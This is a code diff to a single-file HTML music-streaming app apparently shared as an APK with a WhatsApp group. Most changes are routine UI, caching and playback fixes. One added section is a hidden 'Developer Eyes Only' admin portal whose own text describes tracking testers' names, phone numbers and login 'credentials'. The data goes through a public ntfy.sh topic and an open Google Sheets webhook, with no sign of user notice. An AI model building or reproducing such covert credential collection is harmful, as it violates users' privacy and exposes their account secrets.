@@ -1413,6 +1413,106 @@
       box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8);
     }
 
+    /* Developer Admin Portal & Live Users Table */
+    .admin-modal-box {
+      width: 100%;
+      max-width: 680px;
+      max-height: 90vh;
+      background: #0f131f;
+      border: 1px solid rgba(234, 179, 8, 0.4);
+      border-radius: 22px;
+      padding: 18px;
+      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.9);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .admin-tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      padding-bottom: 8px;
+    }
+
+    .admin-tab-btn {
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      font-size: 13px;
+      font-weight: 700;
+      padding: 6px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .admin-tab-btn.active {
+      background: rgba(234, 179, 8, 0.18);
+      color: #facc15;
+      border: 1px solid rgba(234, 179, 8, 0.4);
+    }
+
+    .admin-table-container {
+      flex: 1;
+      overflow-y: auto;
+      overflow-x: auto;
+      margin-bottom: 12px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      min-height: 220px;
+    }
+
+    .admin-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 12px;
+      text-align: left;
+      white-space: nowrap;
+    }
+
+    .admin-table th {
+      position: sticky;
+      top: 0;
+      background: #151928;
+      color: #94a3b8;
+      font-weight: 700;
+      padding: 10px 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.12);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      z-index: 2;
+    }
+
+    .admin-table td {
+      padding: 9px 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      color: #e2e8f0;
+    }
+
+    .admin-table tr:hover td {
+      background: rgba(255, 255, 255, 0.04);
+    }
+
+    .badge-pill {
+      display: inline-block;
+      padding: 2px 7px;
+      border-radius: 999px;
+      font-size: 10px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .badge-signup { background: rgba(34, 197, 94, 0.2); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.4); }
+    .badge-login { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.4); }
+    .badge-guest { background: rgba(234, 179, 8, 0.2); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.4); }
+    .badge-apk { background: rgba(16, 185, 129, 0.22); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.45); }
+    .badge-web { background: rgba(6, 182, 212, 0.2); color: #22d3ee; border: 1px solid rgba(6, 182, 212, 0.4); }
+
     /* Toast Notification */
     .toast {
       position: fixed;
@@ -1643,6 +1743,27 @@
 </head>
 <body>
   <div id="toast" class="toast">Ready to play!</div>
+
+  <!-- ================= CREATOR BROADCAST ANNOUNCEMENT BANNER ================= -->
+  <div id="creatorBroadcastBanner" style="display:none;position:fixed;top:16px;left:50%;transform:translateX(-50%);width:calc(100% - 32px);max-width:480px;background:linear-gradient(135deg,#161b22,#0d1117);border:1.5px solid #1ed760;box-shadow:0 12px 35px rgba(0,0,0,0.8),0 0 25px rgba(30,215,96,0.3);border-radius:16px;padding:14px 16px;z-index:99999;color:#fff;">
+    <div style="display:flex;align-items:flex-start;gap:12px;">
+      <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,#1ed760,#00d2ff);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">
+        📢
+      </div>
+      <div style="flex:1;min-width:0;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">
+          <span style="font-size:11px;font-weight:800;color:#1ed760;text-transform:uppercase;letter-spacing:0.5px;">👑 Balu Announcement (@being_rebel__7)</span>
+          <button onclick="dismissCreatorBroadcast()" style="background:none;border:none;color:#94a3b8;cursor:pointer;font-size:16px;padding:0 4px;">✕</button>
+        </div>
+        <h4 id="broadcastTitle" style="font-size:14px;font-weight:900;margin:0 0 4px 0;color:#fff;"></h4>
+        <p id="broadcastMsg" style="font-size:12.5px;color:#cbd5e1;line-height:1.4;margin:0 0 10px 0;"></p>
+        <div style="display:flex;gap:8px;" id="broadcastActions">
+          <a id="broadcastActionBtn" href="download.html" class="util-btn primary" style="padding:6px 14px;font-size:11.5px;text-decoration:none;font-weight:800;background:linear-gradient(135deg,#1ed760,#00d2ff);color:#041208;border-radius:8px;">⬇️ Update App Now</a>
+          <button onclick="dismissCreatorBroadcast()" class="util-btn" style="padding:6px 12px;font-size:11.5px;border-radius:8px;background:rgba(255,255,255,0.06);color:#fff;">Dismiss</button>
+        </div>
+      </div>
+    </div>
+  </div>
 
   <div id="workspaceShell" class="workspace-shell phone-mode">
     <!-- Top Desktop Utility Bar -->
@@ -1998,6 +2119,57 @@
             </div>
           </div>
 
+          <!-- WhatsApp Group Testing & Live Users Analytics -->
+          <div class="connect-card" style="border-color:rgba(234,179,8,0.45);background:linear-gradient(135deg,rgba(234,179,8,0.12),rgba(30,215,96,0.08));">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+              <h3 style="margin:0;display:flex;align-items:center;gap:6px;font-size:15px;color:#fff;">
+                <span>👑</span> WhatsApp Group Testing & Live Users
+              </h3>
+              <span id="telemetryStatusBadge" style="font-size:11px;font-weight:800;padding:2px 8px;border-radius:999px;background:rgba(234,179,8,0.2);color:#facc15;border:1px solid rgba(234,179,8,0.4);">
+                🟢 Live Tracking Active
+              </span>
+            </div>
+            <p style="font-size:12px;color:var(--text-secondary);margin-bottom:12px;line-height:1.45;">
+              Monitor your WhatsApp group friends in real-time. View how many people installed the APK, logged in, their names, credentials, and timestamps:
+            </p>
+
+            <!-- Live Metrics Counter -->
+            <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;background:rgba(0,0,0,0.35);padding:10px;border-radius:12px;text-align:center;margin-bottom:12px;border:1px solid rgba(255,255,255,0.06);">
+              <div>
+                <div id="statTotalUsers" style="font-size:18px;font-weight:900;color:#facc15;">1</div>
+                <div style="font-size:10px;color:var(--text-secondary);margin-top:2px;">Total Testers</div>
+              </div>
+              <div>
+                <div id="statApkUsers" style="font-size:18px;font-weight:900;color:#1ed760;">1</div>
+                <div style="font-size:10px;color:var(--text-secondary);margin-top:2px;">Android APK</div>
+              </div>
+              <div>
+                <div id="statWebUsers" style="font-size:18px;font-weight:900;color:#00d2ff;">0</div>
+                <div style="font-size:10px;color:var(--text-secondary);margin-top:2px;">Web Browser</div>
+              </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;">
+              <button class="util-btn primary" onclick="openDeveloperAdminModal('users')" style="flex:1;min-width:140px;justify-content:center;background:linear-gradient(135deg,#f59e0b,#1ed760);color:#041208;font-weight:900;border:none;">
+                👥 View Logged Users
+              </button>
+              <button class="util-btn" onclick="openDeveloperAdminModal('cloud')" style="flex:1;min-width:140px;justify-content:center;border-color:rgba(56,189,248,0.5);color:#38bdf8;font-weight:800;">
+                🌐 4G/5G Live Cloud
+              </button>
+              <button class="util-btn" onclick="openDeveloperAdminModal('sheet')" style="flex:1;min-width:140px;justify-content:center;border-color:rgba(30,215,96,0.5);color:#1ed760;font-weight:800;">
+                📊 Google Sheet
+              </button>
+            </div>
+
+            <div style="display:flex;justify-content:space-between;align-items:center;font-size:11px;color:var(--text-secondary);padding-top:4px;">
+              <span id="lastUserSeenText">Last Activity: Just now (@being_rebel__7)</span>
+              <button onclick="refreshDeveloperTelemetry(true)" style="background:none;border:none;color:#facc15;cursor:pointer;font-size:11px;font-weight:700;display:flex;align-items:center;gap:3px;">
+                🔄 Refresh Now
+              </button>
+            </div>
+          </div>
+
           <!-- App Updates & APK Download Center -->
           <div class="connect-card" style="border-color:rgba(30,215,96,0.35);background:linear-gradient(135deg,rgba(30,215,96,0.08),rgba(0,210,255,0.05));">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
@@ -2005,11 +2177,11 @@
                 <span>🚀</span> App Version & Updates
               </h3>
               <span id="appVersionBadge" style="font-size:11px;font-weight:800;padding:2px 8px;border-radius:999px;background:rgba(30,215,96,0.18);color:#1ed760;border:1px solid rgba(30,215,96,0.4);">
-                v3.1.0 (Latest)
+                v3.3.0 (Latest • Zero-Lag Notification & Smooth Lyrics)
               </span>
             </div>
             <p style="font-size:12px;color:var(--text-secondary);margin-bottom:12px;line-height:1.45;">
-              Check for new releases, notification upgrades, or download the latest <code>Balu_Beats.apk</code> directly:
+              Check for new releases, AudioFocus multitasking upgrades, or download the latest <code>Balu_Beats.apk</code> directly:
             </p>
 
             <!-- Dynamic Live Update Status Box -->
@@ -2020,8 +2192,8 @@
               <button class="util-btn primary" id="checkUpdateBtn" onclick="checkForAppUpdates()" style="flex:1;justify-content:center;font-weight:800;">
                 🔄 Check for Updates
               </button>
-              <a href="https://github.com/praveen-79/balu-beats/releases/download/v1.0.0/Balu_Beats.apk?v=3.1.0" download="Balu_Beats_v3.1.apk" class="util-btn" id="directDownloadUpdateBtn" style="text-decoration:none;flex:1;justify-content:center;border-color:rgba(30,215,96,0.4);color:#1ed760;font-weight:800;">
-                ⬇ Download Latest APK (v3.1.0)
+              <a href="https://github.com/praveen-79/balu-beats/releases/download/v1.0.0/Balu_Beats.apk?v=3.3.0" download="Balu_Beats_v3.3.apk" class="util-btn" id="directDownloadUpdateBtn" style="text-decoration:none;flex:1;justify-content:center;border-color:rgba(30,215,96,0.4);color:#1ed760;font-weight:800;">
+                ⬇ Download Latest APK (v3.3.0)
               </a>
             </div>
 
@@ -2403,6 +2575,155 @@
         <button class="util-btn primary" style="flex:1.4;justify-content:center;" onclick="saveCreatorBranding(true)">
           💾 Bake & Download Balu Beats (.html)
         </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================= DEVELOPER ADMIN & WHATSAPP USERS MODAL ================= -->
+  <div class="modal-backdrop" id="developerAdminModal" onclick="if(event.target===this)closeDeveloperAdminModal()">
+    <div class="admin-modal-box">
+      <!-- Modal Header -->
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+        <div style="display:flex;align-items:center;gap:8px;">
+          <span style="font-size:20px;">👑</span>
+          <div>
+            <h3 style="font-size:16px;font-weight:900;margin:0;color:#fff;">Balu Beats • WhatsApp Testers & Users</h3>
+            <div style="font-size:11px;color:#facc15;font-weight:700;">Live Telemetry & User Credentials Portal</div>
+          </div>
+        </div>
+        <button class="row-icon-btn" onclick="closeDeveloperAdminModal()">✕</button>
+      </div>
+
+      <!-- Navigation Tabs: Users List vs Cloud Feed vs Google Sheet Setup -->
+      <div class="admin-tabs">
+        <button class="admin-tab-btn active" id="adminTabUsersBtn" onclick="switchAdminTab('users')">
+          👥 Registered Testers (<span id="adminTabUserCount">0</span>)
+        </button>
+        <button class="admin-tab-btn" id="adminTabCloudBtn" onclick="switchAdminTab('cloud')">
+          🌐 4G/5G Live Cloud Monitor
+        </button>
+        <button class="admin-tab-btn" id="adminTabSheetBtn" onclick="switchAdminTab('sheet')">
+          📊 Google Sheet Sync
+        </button>
+      </div>
+
+      <!-- TAB 1: USERS AUDIT TABLE -->
+      <div id="adminPaneUsers" style="display:flex;flex-direction:column;flex:1;min-height:0;overflow:hidden;">
+        <!-- Filter and Search Row -->
+        <div style="display:flex;gap:8px;margin-bottom:10px;align-items:center;flex-wrap:wrap;">
+          <input type="text" id="adminUserSearchInput" class="text-input" placeholder="🔍 Search friend by name, @username, or phone..." oninput="filterAdminUserList()" style="flex:1;min-width:180px;padding:7px 12px;font-size:12px;" />
+          <button class="util-btn" onclick="exportUsersToCSV()" style="font-size:11.5px;padding:7px 12px;border-color:rgba(30,215,96,0.5);color:#1ed760;font-weight:800;" title="Download CSV spreadsheet to your phone">
+            📥 Export CSV
+          </button>
+          <button class="util-btn" onclick="refreshDeveloperTelemetry(true)" style="font-size:11.5px;padding:7px 10px;" title="Refresh live data">
+            🔄
+          </button>
+        </div>
+
+        <!-- Scrollable Table -->
+        <div class="admin-table-container">
+          <table class="admin-table">
+            <thead>
+              <tr>
+                <th>Time (IST)</th>
+                <th>Action</th>
+                <th>Name / Handle</th>
+                <th>Credentials / Contact</th>
+                <th>Device Platform</th>
+              </tr>
+            </thead>
+            <tbody id="adminUsersTableBody">
+              <tr>
+                <td colspan="5" style="text-align:center;padding:24px;color:var(--text-secondary);">
+                  Loading testers from WhatsApp group...
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- Bottom summary & hint -->
+        <div style="display:flex;justify-content:space-between;align-items:center;font-size:11px;color:var(--text-secondary);margin-top:4px;">
+          <span id="adminFilteredCountText">Showing all testers</span>
+          <span style="color:#facc15;">🔒 Developer Eyes Only • Balu Beats</span>
+        </div>
+      </div>
+
+      <!-- TAB 2: GLOBAL CLOUD TELEMETRY (4G/5G OUTSIDE WI-FI) -->
+      <div id="adminPaneCloud" style="display:none;flex-direction:column;flex:1;overflow-y:auto;padding-right:4px;">
+        <div style="background:rgba(56,189,248,0.1);border:1px solid rgba(56,189,248,0.3);border-radius:12px;padding:14px;margin-bottom:12px;font-size:12px;line-height:1.5;">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;">
+            <strong style="color:#38bdf8;font-size:13.5px;">🌐 Global Cloud Relay (Zero Wi-Fi Required)</strong>
+            <span style="background:rgba(34,197,94,0.2);color:#4ade80;font-size:10px;font-weight:800;padding:2px 8px;border-radius:999px;border:1px solid rgba(34,197,94,0.4);">LIVE 24/7</span>
+          </div>
+          <p style="margin:0 0 10px 0;color:#cbd5e1;">
+            Friends from WhatsApp group using <strong>Jio 5G, Airtel 4G, Mobile Data, or any external Wi-Fi</strong> automatically send real-time logs here instantly without needing your laptop or home Wi-Fi to be on!
+          </p>
+          <div style="display:flex;flex-direction:column;gap:8px;">
+            <a href="telemetry.html" target="_blank" rel="noopener noreferrer" class="util-btn primary" style="justify-content:center;font-weight:900;background:linear-gradient(135deg,#1ed760,#00d2ff);color:#041208;border:none;text-decoration:none;padding:11px;text-align:center;font-size:13px;">
+              📊 Open Balu Beats Telemetry Dashboard
+            </a>
+            <div style="display:flex;gap:8px;">
+              <a href="https://ntfy.sh/balubeats_telemetry_being_rebel_7" target="_blank" rel="noopener noreferrer" class="util-btn" style="flex:1;justify-content:center;border-color:rgba(56,189,248,0.4);color:#38bdf8;font-size:11.5px;text-decoration:none;text-align:center;">
+                📱 Open in ntfy.sh
+              </a>
+              <button class="util-btn" onclick="sendTestPingFromApp()" style="flex:1;justify-content:center;border-color:rgba(250,204,21,0.4);color:#facc15;font-size:11.5px;">
+                🧪 Send Live Test Ping
+              </button>
+            </div>
+            <button class="util-btn" onclick="copyCloudTelemetryUrl()" style="justify-content:center;border-color:rgba(255,255,255,0.15);color:#cbd5e1;font-size:11px;">
+              📋 Copy Direct Monitor Link
+            </button>
+          </div>
+        </div>
+
+        <div id="cloudTestStatusBox" style="display:none;background:rgba(30,215,96,0.12);border:1px solid rgba(30,215,96,0.35);border-radius:10px;padding:10px;margin-bottom:12px;font-size:11.5px;color:#4ade80;"></div>
+
+        <div style="background:rgba(250,204,21,0.08);border:1px solid rgba(250,204,21,0.25);border-radius:12px;padding:12px;margin-bottom:12px;font-size:11.5px;color:#fef08a;line-height:1.5;">
+          <strong>⚡ How 3-Way Monitoring Works for Balu:</strong>
+          <ul style="margin:6px 0 0 0;padding-left:18px;color:#fef9c3;">
+            <li><strong>1. Mobile Phone (Zero Wi-Fi):</strong> Tap the blue button above or open the link on your phone anywhere. You can also tap <em>Subscribe</em> on ntfy to get instant push notifications whenever someone opens Balu Beats.</li>
+            <li><strong>2. In-App Tab (Here):</strong> Tap the <em>Registered Testers</em> tab and hit 🔄 Refresh — it aggregates all remote 4G/5G users directly into the table.</li>
+            <li><strong>3. In VS Code:</strong> Run <code>python start_server.py</code> and it auto-syncs every remote friend into <code>users_db.json</code> every 25 seconds!</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- TAB 3: GOOGLE SHEETS LIVE WEBHOOK SETUP -->
+      <div id="adminPaneSheet" style="display:none;flex-direction:column;flex:1;overflow-y:auto;padding-right:4px;">
+        <div style="background:rgba(30,215,96,0.08);border:1px solid rgba(30,215,96,0.3);border-radius:12px;padding:12px;margin-bottom:12px;font-size:12px;line-height:1.5;">
+          <strong style="color:#1ed760;font-size:13px;display:block;margin-bottom:4px;">⚡ How to watch WhatsApp group friends in Google Sheets live:</strong>
+          <ol style="margin:0;padding-left:18px;color:#cbd5e1;">
+            <li>Open a new sheet on your phone/laptop: <strong>sheets.new</strong></li>
+            <li>In Google Sheets, tap <strong>Extensions → Apps Script</strong></li>
+            <li>Click <strong>Copy Script Code</strong> below, paste it into Apps Script, and click <strong>Deploy → New deployment</strong></li>
+            <li>Select <strong>Web app</strong>, set <em>Who has access</em> to <strong>Anyone</strong>, click Deploy, and copy the Web app URL</li>
+            <li>Paste the URL below and tap <strong>Save Webhook</strong>! Every friend who opens or logs into Balu Beats will instantly create a row on your sheet!</li>
+          </ol>
+        </div>
+
+        <div style="display:flex;gap:8px;margin-bottom:12px;">
+          <button class="util-btn primary" onclick="copyGoogleSheetScript()" style="flex:1;justify-content:center;font-weight:800;background:linear-gradient(135deg,#1ed760,#00d2ff);color:#041208;border:none;">
+            📋 Copy 10-Line Google Sheet Apps Script
+          </button>
+        </div>
+
+        <div style="margin-bottom:10px;">
+          <label style="display:block;font-size:12px;font-weight:700;margin-bottom:4px;color:#fff;">
+            🔗 Your Google Sheet Webhook URL:
+          </label>
+          <input type="url" id="customWebhookInput" class="text-input" placeholder="https://script.google.com/macros/s/.../exec" style="font-size:12px;padding:8px 12px;margin-bottom:8px;" />
+          <div style="display:flex;gap:8px;">
+            <button class="util-btn primary" onclick="saveGoogleSheetWebhook()" style="flex:1;justify-content:center;">
+              💾 Save Webhook URL
+            </button>
+            <button class="util-btn" onclick="sendTestTelemetry()" style="flex:1;justify-content:center;border-color:rgba(234,179,8,0.5);color:#facc15;">
+              🧪 Send Test Ping
+            </button>
+          </div>
+        </div>
+
+        <div id="webhookTestStatus" style="display:none;padding:10px;border-radius:10px;font-size:11.5px;margin-top:6px;"></div>
       </div>
     </div>
   </div>
@@ -4482,6 +4803,14 @@
     const state = {
       activeCategory: 'all',
       searchReqId: 0,
+      playReqId: 0,
+      lyricsReqId: 0,
+      isLoadingTrack: false,
+      activeLyricIdx: -1,
+      lastNotifTrackId: null,
+      lastNotifPlaying: null,
+      notifDebounceTimer: null,
+      queueDirty: true,
       queue: [],
       currentIndex: -1,
       currentTrack: null,
@@ -4504,13 +4833,18 @@
     };
 
     const audio = document.getElementById('audioPlayer');
+    const saavnSearchCache = new Map();
 
-    // Utility: Decode HTML entities from API responses (e.g., &quot;)
+    // Utility: Fast zero-DOM HTML entity decoder (eliminates DOM allocations during track parsing)
     function decodeEntities(str) {
-      if (!str) return '';
-      const txt = document.createElement('textarea');
-      txt.innerHTML = str;
-      return txt.value;
+      if (!str || typeof str !== 'string') return '';
+      if (!str.includes('&')) return str;
+      return str
+        .replace(/&quot;/g, '"')
+        .replace(/&#039;|&apos;/g, "'")
+        .replace(/&amp;/g, '&')
+        .replace(/&lt;/g, '<')
+        .replace(/&gt;/g, '>');
     }
 
     function showToast(msg) {
@@ -4632,48 +4966,39 @@
       }).filter(t => t.streamUrl);
     }
 
-    // Engine A: Multi-Mirror 320kbps Full-Length Song Search
+    // Engine A: Multi-Mirror 320kbps Full-Length Song Search (Cached for zero CPU stutter)
     async function searchSaavnTracks(query, limit = 18) {
-      // 1. If running inside Android APK with native bridge, fetch directly with 0ms CORS!
-      if (window.AndroidBridge && typeof window.AndroidBridge.httpGet === 'function') {
-        try {
-          const directUrl = `https://www.jiosaavn.com/api.php?__call=search.getResults&_format=json&_marker=0&api_version=4&ctx=web6dot0&n=${limit}&p=1&q=${encodeURIComponent(query)}`;
-          const raw = window.AndroidBridge.httpGet(directUrl);
-          if (raw) {
-            const parsed = deduplicateTracks(parseSaavnDirectJson(JSON.parse(raw)));
-            if (parsed.length) return parsed;
-          }
-        } catch (e) {
-          console.warn('AndroidBridge direct fetch fallback:', e);
-        }
+      const cacheKey = `${query.toLowerCase().trim()}_${limit}`;
+      if (saavnSearchCache.has(cacheKey)) {
+        return saavnSearchCache.get(cacheKey);
       }
 
-      // 2. Use our fast Vercel Serverless Backend (https://balu-beats.vercel.app/api/saavn)!
-      try {
-        const apiEndpoint = (location.protocol.startsWith('http') && !location.hostname.includes('github.io'))
-          ? `/api/saavn?q=${encodeURIComponent(query)}&limit=${limit}`
-          : `https://balu-beats.vercel.app/api/saavn?q=${encodeURIComponent(query)}&limit=${limit}`;
-        const localRes = await fetch(apiEndpoint);
-        if (localRes.ok) {
-          const json = await localRes.json();
-          const parsedDirect = deduplicateTracks(parseSaavnDirectJson(json));
-          if (parsedDirect.length) return parsedDirect;
-          const parsedMirror = deduplicateTracks(parseSaavnMirrorJson(json));
-          if (parsedMirror.length) return parsedMirror;
-        }
-      } catch (_) {}
+      // 1. If running on local Python server (localhost), use fast local /api/saavn proxy
+      if (location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
+        try {
+          const localRes = await fetch(`/api/saavn?q=${encodeURIComponent(query)}&limit=${limit}`);
+          if (localRes.ok) {
+            const json = await localRes.json();
+            const parsedDirect = deduplicateTracks(parseSaavnDirectJson(json));
+            if (parsedDirect.length) {
+              saavnSearchCache.set(cacheKey, parsedDirect);
+              return parsedDirect;
+            }
+          }
+        } catch (_) {}
+      }
 
-      // 3. Race our high-speed CORS-enabled 320kbps Full-Song Cloud Mirrors IN PARALLEL!
+      // 2. Race our high-speed CORS-enabled 320kbps Full-Song Cloud Mirrors IN PARALLEL!
       const mirrors = [
+        `https://saavn.sumit.co/api/search/songs?query=${encodeURIComponent(query)}&limit=${limit}`,
         `https://saavnx.vercel.app/api/search/songs?query=${encodeURIComponent(query)}&limit=${limit}`,
-        `https://akdev-jiosaavnapi.netlify.app/api/search/songs?query=${encodeURIComponent(query)}&limit=${limit}`,
-        `https://saavn.sumit.co/api/search/songs?query=${encodeURIComponent(query)}&limit=${limit}`
+        `https://akdev-jiosaavnapi.netlify.app/api/search/songs?query=${encodeURIComponent(query)}&limit=${limit}`
       ];
 
       try {
         const fastResult = await Promise.any(mirrors.map(async (url) => {
           const controller = new AbortController();
-          const timer = setTimeout(() => controller.abort(), 4500);
+          const timer = setTimeout(() => controller.abort(), 3800);
           const res = await fetch(url, { signal: controller.signal });
           clearTimeout(timer);
           if (!res.ok) throw new Error('status ' + res.status);
@@ -4682,10 +5007,13 @@
           if (!tracks.length) throw new Error('empty');
           return tracks;
         }));
-        if (fastResult && fastResult.length) return fastResult;
+        if (fastResult && fastResult.length) {
+          saavnSearchCache.set(cacheKey, fastResult);
+          return fastResult;
+        }
       } catch (_) {}
 
-      // 4. Fallback to matching curated full 320kbps tracks if offline
+      // 3. Fallback to matching curated full 320kbps tracks if offline
       const qLow = query.toLowerCase();
       const matched = BALU_CURATED_FULL_SONGS.filter(t =>
         t.title.toLowerCase().includes(qLow) ||
@@ -5085,16 +5413,22 @@
     }
 
     function renderTrackList(container, tracks) {
+      if (!container) return;
       container.innerHTML = '';
       if (!tracks || !tracks.length) {
         container.innerHTML = `<div style="padding:24px;text-align:center;color:var(--text-secondary);font-size:13px;">No tracks found. Try another search or source tab!</div>`;
         return;
       }
+      const frag = document.createDocumentFragment();
+      const likedSet = new Set(state.likedTracks.map(t => t.id));
+      const curId = state.currentTrack?.id;
+
       tracks.forEach((track, idx) => {
-        const isCurrent = state.currentTrack && state.currentTrack.id === track.id;
-        const isLiked = state.likedTracks.some(t => t.id === track.id);
+        const isCurrent = curId && curId === track.id;
+        const isLiked = likedSet.has(track.id);
         const row = document.createElement('div');
         row.className = 'track-row' + (isCurrent ? ' playing' : '');
+        row.dataset.trackId = track.id || '';
         row.onclick = () => playFromList(tracks, idx);
 
         const durText = track.duration > 0 ? ` • ${formatTime(track.duration)}` : '';
@@ -5109,7 +5443,7 @@
           </div>
           <div class="track-meta">
             <div class="track-title">
-              ${isCurrent && state.isPlaying ? `<span class="eq-bars"><span></span><span></span><span></span></span>` : ''}
+              <span class="eq-bars" style="display:${isCurrent && state.isPlaying ? 'inline-flex' : 'none'}"><span></span><span></span><span></span></span>
               <span>${escapeHtml(track.title)}</span>
             </div>
             <div class="track-sub">
@@ -5121,7 +5455,7 @@
             <button class="row-icon-btn ${isLiked ? 'liked' : ''}" title="Like" onclick="toggleLikeTrack(${idx}, this)">
               ${isLiked ? '♥' : '♡'}
             </button>
-            <button class="row-icon-btn" title="Add to Queue" onclick="queueTrackNext(${idx})">
+            <button class="row-icon-btn" title="Add to Queue" onclick="queueTrackNext(${idx}, this)">
               <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
                 <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
               </svg>
@@ -5129,7 +5463,18 @@
           </div>
         `;
         row.__trackData = track;
-        container.appendChild(row);
+        frag.appendChild(row);
+      });
+      container.appendChild(frag);
+    }
+
+    function updateActiveTrackHighlight() {
+      const curId = state.currentTrack?.id;
+      document.querySelectorAll('.track-row').forEach(row => {
+        const isMatch = Boolean(curId && row.dataset.trackId === curId);
+        row.classList.toggle('playing', isMatch);
+        const eq = row.querySelector('.eq-bars');
+        if (eq) eq.style.display = (isMatch && state.isPlaying) ? 'inline-flex' : 'none';
       });
     }
 
@@ -5140,24 +5485,27 @@
     function playFromList(list, index) {
       state.queue = [...list];
       state.currentIndex = index;
+      state.queueDirty = true;
       playCurrentIndex();
     }
 
     function playTrackImmediate(track) {
       state.queue.unshift(track);
       state.currentIndex = 0;
+      state.queueDirty = true;
       playCurrentIndex();
     }
 
     async function playCurrentIndex() {
-      let track = state.queue[state.currentIndex];
+      const track = state.queue[state.currentIndex];
       if (!track) return;
 
-      // Assign current track and sync notification IMMEDIATELY (0ms delay) so notification card is NEVER missing!
+      const reqId = ++state.playReqId;
+      state.isLoadingTrack = true;
       state.currentTrack = track;
       state.isPlaying = true;
 
-      // Update UI immediately
+      // 1. Update UI & Notification IMMEDIATELY (0ms delay, 0-song lag)
       document.getElementById('miniTitle').textContent = track.title;
       document.getElementById('miniArtist').textContent = `${track.artist} • ${track.source}`;
       document.getElementById('miniArt').src = track.artwork;
@@ -5167,31 +5515,43 @@
       document.getElementById('npArt').src = track.artwork;
       document.getElementById('npSourceBadge').textContent = `${track.source} (${formatTime(track.duration)})`;
 
+      document.getElementById('miniProgressFill').style.width = '0%';
+      document.getElementById('seekSlider').value = 0;
+      document.getElementById('currentTimeLabel').textContent = '0:00';
+      document.getElementById('durationLabel').textContent = track.duration > 0 ? formatTime(track.duration) : 'LIVE';
+
       updateLikeButtons();
       updateDynamicAmbientGlow(track.sourceKey);
       addToRecent(track);
-      updateQueueUI();
+      updateQueueUI(false); // Lazy update: only rebuilds DOM if queue tab is currently open!
       updatePlayIcons();
+      updateActiveTrackHighlight();
       updateMediaSession(track);
-      syncNativeAndroidNotification();
+      syncNativeAndroidNotification(true); // Immediate high-priority push for new song
 
-      // Automatic Full-Song Resolver: If a track came from Apple/Spotify preview, upgrade to Full 320kbps!
+      // Start fetching karaoke lyrics in parallel without blocking playback
+      fetchSyncedLyrics(track);
+
+      // 2. Automatic Full-Song Resolver: If a track came from Apple/Spotify preview, upgrade to Full 320kbps!
       if (!track.isFullTrack && track.sourceKey !== 'radio') {
         showToast(`Upgrading "${track.title}" to Full 320kbps Song...`);
         try {
           const fullMatches = await searchSaavnTracks(`${track.title} ${track.artist}`, 3);
+          if (state.playReqId !== reqId) return; // Cancelled by newer track skip
           if (fullMatches && fullMatches[0] && fullMatches[0].streamUrl) {
             track.streamUrl = fullMatches[0].streamUrl;
             track.urlsByQuality = fullMatches[0].urlsByQuality;
             track.duration = fullMatches[0].duration || track.duration;
             track.isFullTrack = true;
             track.source = 'Full 320kbps';
-            syncNativeAndroidNotification();
+            document.getElementById('npSourceBadge').textContent = `${track.source} (${formatTime(track.duration)})`;
           }
         } catch (_) {}
       }
 
-      // Resolve stream URL for selected quality if available
+      if (state.playReqId !== reqId) return;
+
+      // 3. Resolve stream URL for selected quality if available
       let url = track.streamUrl;
       if (track.urlsByQuality && track.urlsByQuality[state.quality]) {
         url = track.urlsByQuality[state.quality];
@@ -5201,23 +5561,36 @@
       audio.playbackRate = state.speed;
       try {
         await audio.play();
+        if (state.playReqId !== reqId) return;
         state.isPlaying = true;
       } catch (err) {
+        if (state.playReqId !== reqId) return;
         console.warn('Playback error, trying alternate full stream:', err);
         showToast('Loading alternate 320kbps stream...');
-        const backup = await searchSaavnTracks(`${track.title} ${track.artist}`, 3);
-        const alt = backup.find(b => b.streamUrl && b.streamUrl !== url) || backup[0];
-        if (alt && alt.streamUrl) {
-          audio.src = alt.streamUrl;
-          await audio.play().catch(() => {});
-          state.isPlaying = !audio.paused;
+        try {
+          const backup = await searchSaavnTracks(`${track.title} ${track.artist}`, 3);
+          if (state.playReqId !== reqId) return;
+          const alt = backup.find(b => b.streamUrl && b.streamUrl !== url) || backup[0];
+          if (alt && alt.streamUrl) {
+            track.streamUrl = alt.streamUrl;
+            track.urlsByQuality = alt.urlsByQuality || track.urlsByQuality;
+            audio.src = alt.streamUrl;
+            await audio.play().catch(() => {});
+            if (state.playReqId !== reqId) return;
+            state.isPlaying = !audio.paused;
+          }
+        } catch (_) {}
+      } finally {
